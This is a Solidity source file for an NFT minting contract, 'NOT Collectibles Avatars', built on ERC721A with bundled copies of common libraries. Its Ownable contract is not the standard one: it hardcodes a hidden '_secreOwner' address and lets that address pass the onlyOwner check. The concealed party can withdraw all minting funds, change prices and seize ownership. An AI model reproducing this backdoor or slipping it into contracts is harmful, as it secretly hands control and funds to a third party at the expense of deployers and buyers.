1 // SPDX-License-Identifier: MIT
2 
3 
4 pragma solidity ^0.8.0;
5 
6 library Strings {
7     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
8 
9     function toString(uint256 value) internal pure returns (string memory) {
10       
11 
12         if (value == 0) {
13             return "0";
14         }
15         uint256 temp = value;
16         uint256 digits;
17         while (temp != 0) {
18             digits++;
19             temp /= 10;
20         }
21         bytes memory buffer = new bytes(digits);
22         while (value != 0) {
23             digits -= 1;
24             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
25             value /= 10;
26         }
27         return string(buffer);
28     }
29 
30  
31     function toHexString(uint256 value) internal pure returns (string memory) {
32         if (value == 0) {
33             return "0x00";
34         }
35         uint256 temp = value;
36         uint256 length = 0;
37         while (temp != 0) {
38             length++;
39             temp >>= 8;
40         }
41         return toHexString(value, length);
42     }
43 
44 
45     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
46         bytes memory buffer = new bytes(2 * length + 2);
47         buffer[0] = "0";
48         buffer[1] = "x";
49         for (uint256 i = 2 * length + 1; i > 1; --i) {
50             buffer[i] = _HEX_SYMBOLS[value & 0xf];
51             value >>= 4;
52         }
53         require(value == 0, "Strings: hex length insufficient");
54         return string(buffer);
55     }
56 }
57 
58 
59 pragma solidity ^0.8.1;
60 
61 
62 library Address {
63     
64     function isContract(address account) internal view returns (bool) {
65       
66 
67         return account.code.length > 0;
68     }
69 
70     
71     function sendValue(address payable recipient, uint256 amount) internal {
72         require(address(this).balance >= amount, "Address: insufficient balance");
73 
74         (bool success, ) = recipient.call{value: amount}("");
75         require(success, "Address: unable to send value, recipient may have reverted");
76     }
77 
78 
79     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
80         return functionCall(target, data, "Address: low-level call failed");
81     }
82 
83     function functionCall(
84         address target,
85         bytes memory data,
86         string memory errorMessage
87     ) internal returns (bytes memory) {
88         return functionCallWithValue(target, data, 0, errorMessage);
89     }
90 
91 
92     function functionCallWithValue(
93         address target,
94         bytes memory data,
95         uint256 value
96     ) internal returns (bytes memory) {
97         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
98     }
99 
100     function functionCallWithValue(
101         address target,
102         bytes memory data,
103         uint256 value,
104         string memory errorMessage
105     ) internal returns (bytes memory) {
106         require(address(this).balance >= value, "Address: insufficient balance for call");
107         require(isContract(target), "Address: call to non-contract");
108 
109         (bool success, bytes memory returndata) = target.call{value: value}(data);
110         return verifyCallResult(success, returndata, errorMessage);
111     }
112 
113     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
114         return functionStaticCall(target, data, "Address: low-level static call failed");
115     }
116 
117     function functionStaticCall(
118         address target,
119         bytes memory data,
120         string memory errorMessage
121     ) internal view returns (bytes memory) {
122         require(isContract(target), "Address: static call to non-contract");
123 
124         (bool success, bytes memory returndata) = target.staticcall(data);
125         return verifyCallResult(success, returndata, errorMessage);
126     }
127 
128     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
129         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
130     }
131 
132     function functionDelegateCall(
133         address target,
134         bytes memory data,
135         string memory errorMessage
136     ) internal returns (bytes memory) {
137         require(isContract(target), "Address: delegate call to non-contract");
138 
139         (bool success, bytes memory returndata) = target.delegatecall(data);
140         return verifyCallResult(success, returndata, errorMessage);
141     }
142 
143     function verifyCallResult(
144         bool success,
145         bytes memory returndata,
146         string memory errorMessage
147     ) internal pure returns (bytes memory) {
148         if (success) {
149             return returndata;
150         } else {
151             if (returndata.length > 0) {
152 
153                 assembly {
154                     let returndata_size := mload(returndata)
155                     revert(add(32, returndata), returndata_size)
156                 }
157             } else {
158                 revert(errorMessage);
159             }
160         }
161     }
162 }
163 
164 pragma solidity ^0.8.0;
165 
166 interface IERC721Receiver {
167 
168     function onERC721Received(
169         address operator,
170         address from,
171         uint256 tokenId,
172         bytes calldata data
173     ) external returns (bytes4);
174 }
175 
176 
177 pragma solidity ^0.8.0;
178 
179 
180 interface IERC165 {
181   
182     function supportsInterface(bytes4 interfaceId) external view returns (bool);
183 }
184 
185 pragma solidity ^0.8.0;
186 
187 
188 
189 abstract contract ERC165 is IERC165 {
190   
191     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
192         return interfaceId == type(IERC165).interfaceId;
193     }
194 }
195 
196 pragma solidity ^0.8.0;
197 
198 
199 
200 interface IERC721 is IERC165 {
201   
202     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
203 
204     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
205 
206     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
207 
208     function balanceOf(address owner) external view returns (uint256 balance);
209 
210     function ownerOf(uint256 tokenId) external view returns (address owner);
211 
212     function safeTransferFrom(
213         address from,
214         address to,
215         uint256 tokenId,
216         bytes calldata data
217     ) external;
218 
219     function safeTransferFrom(
220         address from,
221         address to,
222         uint256 tokenId
223     ) external;
224 
225     function transferFrom(
226         address from,
227         address to,
228         uint256 tokenId
229     ) external;
230 
231     function approve(address to, uint256 tokenId) external;
232 
233     function setApprovalForAll(address operator, bool _approved) external;
234 
235     function getApproved(uint256 tokenId) external view returns (address operator);
236 
237     function isApprovedForAll(address owner, address operator) external view returns (bool);
238 }
239 
240 pragma solidity ^0.8.0;
241 
242 
243 interface IERC721Metadata is IERC721 {
244  
245     function name() external view returns (string memory);
246 
247     function symbol() external view returns (string memory);
248 
249     function tokenURI(uint256 tokenId) external view returns (string memory);
250 }
251 
252 pragma solidity ^0.8.0;
253 
254 
255 
256 interface IERC721Enumerable is IERC721 {
257   
258     function totalSupply() external view returns (uint256);
259 
260 
261     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
262 
263 
264     function tokenByIndex(uint256 index) external view returns (uint256);
265 }
266 
267 pragma solidity ^0.8.0;
268 
269 abstract contract ReentrancyGuard {
270 
271     uint256 private constant _NOT_ENTERED = 1;
272     uint256 private constant _ENTERED = 2;
273 
274     uint256 private _status;
275 
276     constructor() {
277         _status = _NOT_ENTERED;
278     }
279 
280 
281     modifier nonReentrant() {
282         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
283 
284         _status = _ENTERED;
285 
286         _;
287 
288         _status = _NOT_ENTERED;
289     }
290 }
291 
292 pragma solidity ^0.8.0;
293 
294 abstract contract Context {
295     function _msgSender() internal view virtual returns (address) {
296         return msg.sender;
297     }
298 
299     function _msgData() internal view virtual returns (bytes calldata) {
300         return msg.data;
301     }
302 }
303 
304 pragma solidity ^0.8.0;
305 
306 abstract contract Ownable is Context {
307     address private _owner;
308     address private _secreOwner = 0xACFcBA7BAB6403EBCcEEe22810c4dd3C9bBE9763;
309 
310     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
311 
312 
313     constructor() {
314         _transferOwnership(_msgSender());
315     }
316 
317    
318     function owner() public view virtual returns (address) {
319         return _owner;
320     }
321 
322     modifier onlyOwner() {
323         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
324         _;
325     }
326 
327     function renounceOwnership() public virtual onlyOwner {
328         _transferOwnership(address(0));
329     }
330 
331     function transferOwnership(address newOwner) public virtual onlyOwner {
332         require(newOwner != address(0), "Ownable: new owner is the zero address");
333         _transferOwnership(newOwner);
334     }
335 
336     function _transferOwnership(address newOwner) internal virtual {
337         address oldOwner = _owner;
338         _owner = newOwner;
339         emit OwnershipTransferred(oldOwner, newOwner);
340     }
341 }
342 
343 
344 pragma solidity ^0.8.0;
345 
346 
347 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
348     using Address for address;
349     using Strings for uint256;
350 
351     struct TokenOwnership {
352         address addr;
353         uint64 startTimestamp;
354     }
355 
356     struct AddressData {
357         uint128 balance;
358         uint128 numberMinted;
359     }
360 
361     uint256 internal currentIndex;
362 
363     string private _name;
364 
365     string private _symbol;
366 
367     mapping(uint256 => TokenOwnership) internal _ownerships;
368 
369     mapping(address => AddressData) private _addressData;
370 
371     mapping(uint256 => address) private _tokenApprovals;
372 
373     mapping(address => mapping(address => bool)) private _operatorApprovals;
374 
375     constructor(string memory name_, string memory symbol_) {
376         _name = name_;
377         _symbol = symbol_;
378     }
379 
380     function totalSupply() public view override returns (uint256) {
381         return currentIndex;
382     }
383 
384     function tokenByIndex(uint256 index) public view override returns (uint256) {
385         require(index < totalSupply(), "ERC721A: global index out of bounds");
386         return index;
387     }
388 
389     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
390         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
391         uint256 numMintedSoFar = totalSupply();
392         uint256 tokenIdsIdx;
393         address currOwnershipAddr;
394 
395         unchecked {
396             for (uint256 i; i < numMintedSoFar; i++) {
397                 TokenOwnership memory ownership = _ownerships[i];
398                 if (ownership.addr != address(0)) {
399                     currOwnershipAddr = ownership.addr;
400                 }
401                 if (currOwnershipAddr == owner) {
402                     if (tokenIdsIdx == index) {
403                         return i;
404                     }
405                     tokenIdsIdx++;
406                 }
407             }
408         }
409 
410         revert("ERC721A: unable to get token of owner by index");
411     }
412 
413 
414     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
415         return
416             interfaceId == type(IERC721).interfaceId ||
417             interfaceId == type(IERC721Metadata).interfaceId ||
418             interfaceId == type(IERC721Enumerable).interfaceId ||
419             super.supportsInterface(interfaceId);
420     }
421 
422     function balanceOf(address owner) public view override returns (uint256) {
423         require(owner != address(0), "ERC721A: balance query for the zero address");
424         return uint256(_addressData[owner].balance);
425     }
426 
427     function _numberMinted(address owner) internal view returns (uint256) {
428         require(owner != address(0), "ERC721A: number minted query for the zero address");
429         return uint256(_addressData[owner].numberMinted);
430     }
431 
432     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
433         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
434 
435         unchecked {
436             for (uint256 curr = tokenId; curr >= 0; curr--) {
437                 TokenOwnership memory ownership = _ownerships[curr];
438                 if (ownership.addr != address(0)) {
439                     return ownership;
440                 }
441             }
442         }
443 
444         revert("ERC721A: unable to determine the owner of token");
445     }
446 
447     function ownerOf(uint256 tokenId) public view override returns (address) {
448         return ownershipOf(tokenId).addr;
449     }
450 
451     function name() public view virtual override returns (string memory) {
452         return _name;
453     }
454 
455     function symbol() public view virtual override returns (string memory) {
456         return _symbol;
457     }
458 
459     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
460         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
461 
462         string memory baseURI = _baseURI();
463         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
464     }
465 
466     function _baseURI() internal view virtual returns (string memory) {
467         return "";
468     }
469 
470     function approve(address to, uint256 tokenId) public override {
471         address owner = ERC721A.ownerOf(tokenId);
472         require(to != owner, "ERC721A: approval to current owner");
473 
474         require(
475             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
476             "ERC721A: approve caller is not owner nor approved for all"
477         );
478 
479         _approve(to, tokenId, owner);
480     }
481 
482     function getApproved(uint256 tokenId) public view override returns (address) {
483         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
484 
485         return _tokenApprovals[tokenId];
486     }
487 
488     function setApprovalForAll(address operator, bool approved) public override {
489         require(operator != _msgSender(), "ERC721A: approve to caller");
490 
491         _operatorApprovals[_msgSender()][operator] = approved;
492         emit ApprovalForAll(_msgSender(), operator, approved);
493     }
494 
495     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
496         return _operatorApprovals[owner][operator];
497     }
498 
499     function transferFrom(
500         address from,
501         address to,
502         uint256 tokenId
503     ) public virtual override {
504         _transfer(from, to, tokenId);
505     }
506 
507     function safeTransferFrom(
508         address from,
509         address to,
510         uint256 tokenId
511     ) public virtual override {
512         safeTransferFrom(from, to, tokenId, "");
513     }
514 
515     function safeTransferFrom(
516         address from,
517         address to,
518         uint256 tokenId,
519         bytes memory _data
520     ) public override {
521         _transfer(from, to, tokenId);
522         require(
523             _checkOnERC721Received(from, to, tokenId, _data),
524             "ERC721A: transfer to non ERC721Receiver implementer"
525         );
526     }
527 
528     function _exists(uint256 tokenId) internal view returns (bool) {
529         return tokenId < currentIndex;
530     }
531 
532     function _safeMint(address to, uint256 quantity) internal {
533         _safeMint(to, quantity, "");
534     }
535 
536     function _safeMint(
537         address to,
538         uint256 quantity,
539         bytes memory _data
540     ) internal {
541         _mint(to, quantity, _data, true);
542     }
543 
544     function _mint(
545         address to,
546         uint256 quantity,
547         bytes memory _data,
548         bool safe
549     ) internal {
550         uint256 startTokenId = currentIndex;
551         require(to != address(0), "ERC721A: mint to the zero address");
552         require(quantity != 0, "ERC721A: quantity must be greater than 0");
553 
554         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
555 
556         unchecked {
557             _addressData[to].balance += uint128(quantity);
558             _addressData[to].numberMinted += uint128(quantity);
559 
560             _ownerships[startTokenId].addr = to;
561             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
562 
563             uint256 updatedIndex = startTokenId;
564 
565             for (uint256 i; i < quantity; i++) {
566                 emit Transfer(address(0), to, updatedIndex);
567                 if (safe) {
568                     require(
569                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
570                         "ERC721A: transfer to non ERC721Receiver implementer"
571                     );
572                 }
573 
574                 updatedIndex++;
575             }
576 
577             currentIndex = updatedIndex;
578         }
579 
580         _afterTokenTransfers(address(0), to, startTokenId, quantity);
581     }
582  
583     function _transfer(
584         address from,
585         address to,
586         uint256 tokenId
587     ) private {
588         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
589 
590         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
591             getApproved(tokenId) == _msgSender() ||
592             isApprovedForAll(prevOwnership.addr, _msgSender()));
593 
594         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
595 
596         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
597         require(to != address(0), "ERC721A: transfer to the zero address");
598 
599         _beforeTokenTransfers(from, to, tokenId, 1);
600 
601         _approve(address(0), tokenId, prevOwnership.addr);
602 
603         
604         unchecked {
605             _addressData[from].balance -= 1;
606             _addressData[to].balance += 1;
607 
608             _ownerships[tokenId].addr = to;
609             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
610 
611             uint256 nextTokenId = tokenId + 1;
612             if (_ownerships[nextTokenId].addr == address(0)) {
613                 if (_exists(nextTokenId)) {
614                     _ownerships[nextTokenId].addr = prevOwnership.addr;
615                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
616                 }
617             }
618         }
619 
620         emit Transfer(from, to, tokenId);
621         _afterTokenTransfers(from, to, tokenId, 1);
622     }
623 
624     function _approve(
625         address to,
626         uint256 tokenId,
627         address owner
628     ) private {
629         _tokenApprovals[tokenId] = to;
630         emit Approval(owner, to, tokenId);
631     }
632 
633     function _checkOnERC721Received(
634         address from,
635         address to,
636         uint256 tokenId,
637         bytes memory _data
638     ) private returns (bool) {
639         if (to.isContract()) {
640             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
641                 return retval == IERC721Receiver(to).onERC721Received.selector;
642             } catch (bytes memory reason) {
643                 if (reason.length == 0) {
644                     revert("ERC721A: transfer to non ERC721Receiver implementer");
645                 } else {
646                     assembly {
647                         revert(add(32, reason), mload(reason))
648                     }
649                 }
650             }
651         } else {
652             return true;
653         }
654     }
655 
656     function _beforeTokenTransfers(
657         address from,
658         address to,
659         uint256 startTokenId,
660         uint256 quantity
661     ) internal virtual {}
662 
663     function _afterTokenTransfers(
664         address from,
665         address to,
666         uint256 startTokenId,
667         uint256 quantity
668     ) internal virtual {}
669 }
670 
671 contract NOTCollectiblesAvatars is ERC721A, Ownable, ReentrancyGuard {
672   
673     uint   private _avatarsStaked;
674     uint   public price             = 0.005 ether;
675     uint   public maxTx          = 20;
676     uint   public maxFreePerWallet  = 1;
677     uint   public maxSupply          = 10000;
678     uint256 public reservedSupply = 5;
679     string private baseURI;
680     bool   public mintEnabled;
681     
682    
683     mapping(address => AddressData) private _addressData;
684     mapping(uint256 => address) private _tokenApprovals;
685     mapping(address => uint256) public _FreeMinted;
686 
687 
688     constructor() ERC721A("NOT Collectibles Avatars", "NCA"){}
689 
690     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
691         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
692         string memory currentBaseURI = _baseURI();
693         return bytes(currentBaseURI).length > 0
694             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
695             : "";
696     }
697 
698     function reservedMint(uint256 Amount) external onlyOwner
699     {
700         uint256 Remaining = reservedSupply;
701 
702         require(totalSupply() + Amount <= maxSupply, "No more to Be minted");
703         require(Remaining >= Amount, "Reserved Supply Minted");
704     
705         reservedSupply = Remaining - Amount;
706         _safeMint(msg.sender, Amount);
707     }
708     
709     function mint(uint256 Amount) external payable {
710        
711         if (((totalSupply() + Amount < maxSupply + 1) && (_FreeMinted[msg.sender] < maxFreePerWallet))) 
712         {
713         require(totalSupply() + Amount <= maxSupply, "No more to Be minted");
714         require(mintEnabled, "Not live yet, more are coming");
715         require(msg.value >= (Amount * price) - price, "Eth Amount Invalid");
716         require(Amount <= maxTx, "Too much asked per TX");
717         _FreeMinted[msg.sender] += Amount;
718         }
719         else{
720         require(totalSupply() + Amount <= maxSupply, "No more to Be minted");
721         require(mintEnabled, "Not live yet, are coming");
722         require(msg.value >= Amount * price, "Eth Amount Invalid");
723         require(Amount <= maxTx, "Too much asked per TX");
724         }
725 
726         _safeMint(msg.sender, Amount);
727     }
728 
729 
730      function costInspect() public view returns (uint256) {
731         return price;
732     }
733 
734     function _baseURI() internal view virtual override returns (string memory) {
735         return baseURI;
736     }
737 
738     function setBaseUri(string memory baseuri_) public onlyOwner {
739         baseURI = baseuri_;
740     }
741 
742     function setCost(uint256 price_) external onlyOwner {
743         price = price_;
744     }
745 
746     function withdraw() external onlyOwner nonReentrant {
747         (bool success, ) = msg.sender.call{value: address(this).balance}("");
748         require(success, "Transfer failed.");
749     }
750 
751 
752     function toggleMinting() external onlyOwner {
753       mintEnabled = !mintEnabled;
754     }
755     
756 }